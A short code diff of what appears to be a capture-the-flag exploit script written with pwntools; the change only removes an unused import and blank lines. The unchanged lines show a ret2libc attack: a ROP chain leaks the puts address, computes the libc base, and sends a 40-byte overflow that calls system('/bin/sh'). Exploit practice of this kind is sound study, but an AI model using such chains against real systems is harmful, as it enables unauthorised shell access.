@@ -1,5 +1,4 @@
 
-from ctypes import LibraryLoader
 from pwn import *
 
 context.arch = 'amd64'
@@ -16,7 +15,6 @@ puts_off = libc.sym.puts
 r.recvuntil(b'[y/N]\n')
 
 rop_ = ROP(e)
-
 rop_.call(e.sym.puts, [e.got.puts])
 rop_.call(e.sym.main)
 
@@ -28,7 +26,6 @@ libc.address = LIBC_BASE
 
 rop_ = ROP(libc)
 rop_.call(libc.sym.system, [next(libc.search(b'/bin/sh'))])
-
 
 r.sendline(fit({ 40:rop_.chain() }))
 
